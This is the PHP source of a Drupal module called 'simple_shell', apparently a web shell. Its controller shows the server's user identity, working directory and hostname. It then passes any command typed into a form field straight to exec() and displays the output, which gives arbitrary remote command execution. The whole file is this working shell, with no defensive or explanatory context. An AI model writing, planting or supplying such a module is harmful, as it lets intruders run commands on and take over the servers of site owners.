<?php
namespace Drupal\simple_shell\Controller;

use Drupal\Core\Controller\ControllerBase;
use Drupal\Core\Form\FormState;

class SimpleShellController extends ControllerBase {
	public function content() {
		$id = [];
		exec('id',$id);
		$id = implode('<br />',$id);
		$pwd = [];
		exec('pwd',$pwd);
		$pwd = implode('<br />',$pwd);
		$hostname = [];
		exec('hostname',$hostname);
		$hostname = implode('<br />',$hostname);


		$form_state = new FormState();
		$form_state->setRebuild();
		$form = \Drupal::formBuilder()->buildForm('Drupal\simple_shell\Form\SimpleShellForm',$form_state);
		if($form_state->getValue('command')){
			$ret = [];
			$retCode = 0;
			exec($form['command']['#value'],$ret,$retCode);

			return array(
				'#theme' => 'simple_shell',
				'#form' => $form,
				'#retcode' => $retCode,
				'#ret' => implode('<br />',$ret),
				'#id' => $id,
				'#pwd' => $pwd,
				'#hostname' => $hostname,
			);
		}
		return array(
			'#theme' => 'simple_shell',
			'#form' => $form,
			'#id' => $id,
			'#pwd' => $pwd,
			'#hostname' => $hostname,
		);
	

	}
}


